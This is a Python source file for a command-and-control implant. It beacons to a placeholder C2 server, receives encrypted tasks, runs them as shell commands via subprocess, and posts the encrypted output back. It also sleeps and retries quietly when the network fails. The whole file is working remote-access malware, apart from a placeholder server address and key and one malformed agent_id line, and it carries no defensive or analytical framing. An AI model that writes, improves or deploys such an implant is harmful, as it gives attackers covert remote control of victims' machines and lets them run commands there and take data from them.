import time
import requests
import subprocess
import uuid
from cryptography.fernet import Fernet

# ==========================================
# MODULE 1: INITIALIZATION & IDENTITY
# ==========================================

# 1. Hardcode the raw bytes from your C2 Server
SERVER_KEY = b"SERVER KEY"
cipher_suite = Fernet(SERVER_KEY)

# 2. Generate the unique fingerprint once on startup
agent_id = #uuid.uuid4().hex (will need to hard code the agent id in order for the server to provide tasks)

# Set your C2 Server IP/Domain here
C2_SERVER = "c2 server here"


# ==========================================
# MODULE 2: THE EXECUTION ENGINE
# ==========================================

def execute_command(command_string):
    # Run the command
    process = subprocess.run(command_string, shell=True, capture_output=True, text=True)

    output = process.stdout
    error = process.stderr

    # Failsafe 1: If the command produced standard text, return it.
    if output:
        return output

    # Failsafe 2: If it failed and produced an error message, return that.
    if error:
        return error

    # Failsafe 3: If it succeeded but the OS stayed completely silent (e.g., creating a folder)
    return "[+] Command executed successfully, but produced no terminal output."


# ==========================================
# MODULE 3: THE BEACON LOOP
# ==========================================

while True:
    try:
        # --- PHASE 1: THE BEACON ---
        id = agent_id.encode("utf-8")
        encrypted_id_bytes = cipher_suite.encrypt(id)
        standard_id = encrypted_id_bytes.decode("utf-8")

        json_payload = {"id": standard_id}

        response = requests.post(f"{C2_SERVER}/beacon", json=json_payload)

        # --- PHASE 2: THE DECISION ---
        server_data = response.json()
        encrypted_task = server_data["task"]

        task_bytes = encrypted_task.encode("utf-8")
        decrypted_task_bytes = cipher_suite.decrypt(task_bytes)
        plaintext_task = decrypted_task_bytes.decode("utf-8")

        if plaintext_task == "SLEEP":
            time.sleep(10)
            continue

        else:
            # --- PHASE 3: THE RESULT ---
            command_output = execute_command(plaintext_task)

            output_bytes = command_output.encode("utf-8")
            encrypted_output_bytes = cipher_suite.encrypt(output_bytes)
            safe_output_string = encrypted_output_bytes.decode("utf-8")

            result_payload = {
                "id": standard_id,
                "output": safe_output_string
            }

            requests.post(f"{C2_SERVER}/result", json=result_payload)
            time.sleep(10)

    except Exception as e:
        # Failsafe: If the network drops, sleep and try again quietly
        time.sleep(20)
        continue